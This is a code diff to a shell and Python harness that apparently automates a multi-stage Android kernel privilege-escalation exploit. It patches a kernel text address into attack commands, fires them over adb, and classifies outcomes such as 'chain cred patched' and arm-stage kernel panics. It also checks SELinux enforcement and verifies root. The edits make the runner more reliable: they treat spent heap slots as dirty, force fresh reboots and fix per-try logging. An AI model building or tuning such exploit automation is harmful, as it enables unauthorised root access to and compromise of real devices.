@@ -18,6 +18,7 @@ LOAD_MAX_EARLY=26
 LOAD_EARLY_UNTIL=120
 B_RETRIES=2
 B_VERDICT_TIMEOUT=${B_VERDICT_TIMEOUT:-600}
+B_DRAIN_GRACE=${B_DRAIN_GRACE:-12}
 ALLOW_REBOOT=${ALLOW_REBOOT:-1}
 GATE_MAX_TRIES=2
 A_SLOT_LIST="1 2"
@@ -153,7 +154,9 @@ gate(){
 import sys
 up=float(sys.argv[1]); l1=float(sys.argv[2]); enf=sys.argv[3]
 fire_max=float(sys.argv[4]); reboot_at=float(sys.argv[5]); lmax=float(sys.argv[6])
-assert 0<up<100000, "uptime insane"
+# 该上限只挡解析垃圾值，必须远大于 REBOOT_AT：久置设备（实测 79h）要落到
+# 下面的 GATE-REBOOT，而不是在这里被误判成读数异常。
+assert 0<up<1e9, "uptime insane"
 assert 0<=l1<2000, "loadavg insane"
 if enf != "Enforcing":
     print(f"  GATE-REBOOT enforce={enf} (!=Enforcing; reboot is the only reset)"); sys.exit(2)
@@ -175,7 +178,7 @@ fireA(){
   local slot=$1
   local AL=a${CYCLE}s${slot}_full.log
   sed -e "s/SLIDE_LOCK_SLOT=[0-9]*/SLIDE_LOCK_SLOT=$slot/" \
-      -e "s/tee a_full\.log/tee $AL/" \
+      -e 's/ | tee a_full\.log$//' \
       -e "s/^timeout 60 /timeout $A_TIMEOUT /" \
       scripts/a_command.txt > a${CYCLE}s${slot}_command.txt
   log "A fire slot=$slot (cmd md5 $(md5sum a${CYCLE}s${slot}_command.txt | cut -c1-8))"
@@ -250,13 +253,14 @@ d = open('scripts/b_command.txt', errors='replace').read()
 d = d.replace('SLIDE_TEXT_ADDR=0xffffffd8f0c00000', 'SLIDE_TEXT_ADDR='+t)
 d = re.sub(r'SLIDE_LOCK_SLOT=\d+', 'SLIDE_LOCK_SLOT='+slot, d)
 d = d.replace('SLIDE_V155_RESAMPLE=12', 'SLIDE_V155_RESAMPLE=16')
-d = d.replace('tee b_full.log', f'tee b_t{tryn}_full.log')
+# Strip the in-command tee; fireB owns the only writer for b_t<N>_full.log.
+d = re.sub(r'[ \t]*\|[ \t]*tee b_full\.log[ \t]*$', '', d, flags=re.M)
 d = d.replace('timeout 300 ${ADB} shell', 'timeout 600 ' + adb + ' shell')
 open(f'b_t{tryn}_command.txt','w').write(d)
 for k in ['SLIDE_TEXT_ADDR','SLIDE_LOCK_SLOT','SLIDE_V155_RESAMPLE']:
     m = re.search(k+r'=\S+', d); print('  ', m.group(0) if m else f'{k} MISSING')
 assert 'SLIDE_V155_RESAMPLE=16' in d and t in d and f'SLIDE_LOCK_SLOT={slot}' in d
-assert f'b_t{tryn}_full.log' in d, "per-try log substitution failed"
+assert '| tee b_full.log' not in d, "in-command tee was not stripped"
 PY
   return 0
 }
@@ -265,9 +269,11 @@ fireB(){
   genB "$slot" "$tryn" || return 9
   BL=b_t${tryn}_full.log
   log "B fire slot=$slot try=$tryn (cmd md5 $(md5sum b_t${tryn}_command.txt | cut -c1-8))"
+  # The command template no longer tees; this redirection is the only writer.
   nohup bash b_t${tryn}_command.txt > $BL 2>&1 &
   local fpid=$!
   local waited=0
+  local still=0
   while [ $waited -lt $B_VERDICT_TIMEOUT ]; do
     sleep 5; waited=$((waited+5))
     if [ -s "$BL" ]; then
@@ -279,7 +285,15 @@ sys.exit(0 if ('chain cred patched' in d or 'L-pre-gate exhausted' in d or 'v114
       fi
     fi
     if ! online && [ $waited -ge 20 ]; then break; fi
+    if ! kill -0 "$fpid" 2>/dev/null; then
+      # Local adb shell exited: give the redirect a moment, then classify the log.
+      sleep 2
+      break
+    fi
   done
+  if kill -0 "$fpid" 2>/dev/null && [ "$waited" -ge "$B_VERDICT_TIMEOUT" ]; then
+    still=1
+  fi
   log "  B verdict poll after ${waited}s -> $(wc -l < $BL) log lines"
   B_VERDICT=$(python3 - "$BL" <<'PY'
 import sys
@@ -293,6 +307,7 @@ elif 'L-pre-gate PASS' in d: print("PASS")
 else: print("NONE")
 PY
 )
+  [ "$still" = "1" ] && B_VERDICT=STILL-RUNNING
   log "B verdict slot=$slot => $B_VERDICT"
 }
 verify_root(){
@@ -572,16 +587,18 @@ while [ $CYCLE -lt $MAX_CYCLES ]; do
       PASS)
             B_DIRTY=1
             if ! online; then
-              log "  PASS + device gone => PANIC #78 arm-stage crash (rb_insert_color graft)"
+              log "  PASS + device gone => panic during arm/graft (capture ramoops; do not assume #78)"
               B_PANIC=1; RAMOOPS_DONE=0
               panic_check "$BL"
             else
               log "  PASS = walk armed, slot $B_SLOT DIRTY -> refire forbidden, need a new boot"
             fi
             break;;
-      REJECT) log "  L-gate rejected all draws (walk never fired, slot unconsumed) -> same-slot resample";;
-      MISS) log "  walk MISS (slot unconsumed) -> same-slot resample";;
-      *) log "  unexpected B outcome ($B_VERDICT) -> same-slot resample";;
+      REJECT) log "  L-gate rejected all draws (walk never fired) -> same-slot resample";;
+      MISS) B_DIRTY=1; log "  probe MISS: probe walk already consumed slot $B_SLOT -> NO same-slot refire; fresh boot required"; break;;
+      ARM-ABANDON) B_DIRTY=1; log "  arm abandoned after paint -> slot $B_SLOT spent; NO same-slot refire"; break;;
+      STILL-RUNNING) B_DIRTY=1; log "  B still running at verdict timeout -> treat slot $B_SLOT as spent; no refire"; break;;
+      *) B_DIRTY=1; log "  B outcome '$B_VERDICT' is not a clean pre-walk reject -> slot $B_SLOT spent; no same-slot refire"; break;;
     esac
     sleep 3
   done
@@ -592,7 +609,8 @@ while [ $CYCLE -lt $MAX_CYCLES ]; do
       [ "$REBOOTS" -ge "$MAX_REBOOTS" ] && { log "  reboot budget exhausted -> STOP"; break; }
       continue
     fi
-    log "  boot is spent (dirty slot / device death) -> fresh boot needed"
+    log "  boot is spent (dirty slot / device death) -> ${B_DRAIN_GRACE}s drain grace for v143 hygiene, then fresh boot"
+    sleep "$B_DRAIN_GRACE"
     reboot_once || { log "cannot reach a fresh boot -> STOP"; break; }
     CYCLE=$((CYCLE-1))
     continue
